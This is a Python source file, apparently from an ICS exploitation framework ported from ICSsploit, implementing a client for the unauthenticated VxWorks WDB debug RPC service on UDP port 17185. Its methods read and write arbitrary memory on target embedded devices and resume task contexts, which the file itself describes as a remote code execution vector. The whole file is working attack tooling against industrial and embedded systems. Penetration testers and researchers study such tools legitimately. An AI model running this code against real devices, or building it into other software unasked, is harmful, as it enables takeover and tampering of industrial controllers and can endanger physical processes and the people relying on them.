"""
EmbedXPL-Forge — VxWorks WDB RPC v2 Client
Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek

Python 3 raw-socket implementation of the Wind River WDB (Workbench Debug Bus)
RPC protocol v2 (UDP/17185).  Used to target VxWorks-based embedded devices.

Ported and modernised from ISF Wdb2Client (original: WenZhe Zhu / ICSsploit).
"""

import socket
import struct
import logging
from typing import Optional


WDB_PORT = 17185
WDB_PROC_CONNECT = 0x7A      # WdbConnect
WDB_PROC_MEM_READ = 0x01     # WdbMemRead
WDB_PROC_MEM_WRITE = 0x02    # WdbMemWrite
WDB_PROC_CONTEXT_RESUME = 0x15
WDB_PROC_TGT_INFO = 0x14     # WdbTgtInfoGet

RPC_VERSION = 2
WDB_PROG = 0x55555555
WDB_VERS = 1


class Wdb2Client:
    """VxWorks WDB RPC v2 client for EmbedXPL ICS modules.

    Communicates with the VxWorks WDB agent over UDP/17185.

    Args:
        ip: Target device IP address.
        port: WDB UDP port (default 17185).
        timeout: Socket timeout in seconds (default 3.0).
        mem_buf_size: Chunk size for memory reads (default 300 bytes).
    """

    def __init__(self, ip: str, port: int = WDB_PORT,
                 timeout: float = 3.0, mem_buf_size: int = 300) -> None:
        self._ip = ip
        self._port = port
        self._timeout = timeout
        self._mem_buf_size = mem_buf_size
        self._sock: Optional[socket.socket] = None
        self._xid: int = 1
        self._logger = logging.getLogger(self.__class__.__name__)

    # ------------------------------------------------------------------ #
    # Connection management
    # ------------------------------------------------------------------ #

    def connect(self) -> bool:
        """Open UDP socket and send WdbConnect to verify target is alive.

        Returns:
            True if target responds to WdbConnect, False otherwise.
        """
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.settimeout(self._timeout)
        except OSError as exc:
            self._logger.error("Socket creation failed: %s", exc)
            return False

        pkt = self._build_rpc_call(WDB_PROC_CONNECT, b"\x00\x00\x00\x00")
        rsp = self._send_recv(pkt)
        return rsp is not None

    def disconnect(self) -> None:
        """Close the UDP socket."""
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def __enter__(self) -> "Wdb2Client":
        self.connect()
        return self

    def __exit__(self, *_) -> None:
        self.disconnect()

    # ------------------------------------------------------------------ #
    # Low-level RPC helpers
    # ------------------------------------------------------------------ #

    def _next_xid(self) -> int:
        self._xid = (self._xid + 1) & 0xFFFFFFFF
        return self._xid

    def _build_rpc_call(self, proc: int, data: bytes) -> bytes:
        """Build a minimal ONC-RPC (Sun RPC) call message.

        Args:
            proc: RPC procedure number.
            data: Encoded procedure arguments.

        Returns:
            Serialised RPC call bytes (no record marking, UDP).
        """
        xid = self._next_xid()
        # XID, msg_type=0 (CALL), rpc_version=2, prog, vers, proc
        header = struct.pack(">IIIIII", xid, 0, RPC_VERSION, WDB_PROG, WDB_VERS, proc)
        # Null credentials & verifier
        null_auth = struct.pack(">II", 0, 0)
        return header + null_auth + null_auth + data

    def _send_recv(self, pkt: bytes) -> Optional[bytes]:
        """Send a UDP packet and return the response.

        Returns:
            Response bytes or None on timeout/error.
        """
        if not self._sock:
            self._logger.error("Not connected")
            return None
        try:
            self._sock.sendto(pkt, (self._ip, self._port))
            data, _ = self._sock.recvfrom(4096)
            return data
        except OSError as exc:
            self._logger.debug("send_recv error: %s", exc)
            return None

    # ------------------------------------------------------------------ #
    # WDB procedures
    # ------------------------------------------------------------------ #

    def get_target_info(self) -> Optional[dict]:
        """Call WdbTgtInfoGet (proc 0x14) to retrieve system information.

        Returns:
            Dict with 'agent_version', 'word_size', 'endian' or None.
        """
        pkt = self._build_rpc_call(WDB_PROC_TGT_INFO, b"\x00\x00\x00\x01")
        rsp = self._send_recv(pkt)
        if rsp is None or len(rsp) < 36:
            return None
        try:
            # Skip RPC reply header (28 bytes) + accept_stat (4) + verifier (8)
            offset = 28
            agent_ver = struct.unpack_from(">I", rsp, offset)[0]
            word_size = struct.unpack_from(">I", rsp, offset + 4)[0]
            endian = "big" if struct.unpack_from(">I", rsp, offset + 8)[0] == 0 else "little"
            return {
                "agent_version": agent_ver,
                "word_size": word_size,
                "endian": endian,
            }
        except struct.error:
            return None

    def read_memory(self, address: int, length: int) -> Optional[bytes]:
        """Read arbitrary memory from target VxWorks device.

        Args:
            address: Memory start address.
            length: Number of bytes to read.

        Returns:
            Memory bytes or None on error.
        """
        result = b""
        while length > 0:
            chunk = min(length, self._mem_buf_size)
            args = struct.pack(">IIIII", 0, address, chunk, 0, 1)
            pkt = self._build_rpc_call(WDB_PROC_MEM_READ, args)
            rsp = self._send_recv(pkt)
            if rsp is None or len(rsp) < 36:
                return None if not result else result
            # Parse response: skip RPC header + accept + verf (28 bytes) + status (4) + data header
            try:
                data_len = struct.unpack_from(">I", rsp, 36)[0]
                data = rsp[40:40 + data_len]
                result += data
                address += data_len
                length -= data_len
            except struct.error:
                break
        return result

    def write_memory(self, address: int, data: bytes) -> bool:
        """Write bytes to target VxWorks memory.

        Args:
            address: Target memory address.
            data: Bytes to write.

        Returns:
            True if write succeeded (no error response), False otherwise.
        """
        offset = 0
        while offset < len(data):
            chunk = data[offset:offset + self._mem_buf_size]
            args = struct.pack(">IIIII", 0, address + offset, len(chunk), 0, 1)
            args += struct.pack(">I", len(chunk)) + chunk
            if len(chunk) % 4:
                args += b"\x00" * (4 - len(chunk) % 4)
            pkt = self._build_rpc_call(WDB_PROC_MEM_WRITE, args)
            rsp = self._send_recv(pkt)
            if rsp is None:
                return False
            offset += len(chunk)
        return True

    def resume_context(self, task_id: int = 0) -> bool:
        """Resume a suspended task context (can act as task start / RCE vector).

        Args:
            task_id: Task ID to resume (0 = primary context).

        Returns:
            True if the resume call received a response.
        """
        args = struct.pack(">II", 1, task_id)
        pkt = self._build_rpc_call(WDB_PROC_CONTEXT_RESUME, args)
        return self._send_recv(pkt) is not None
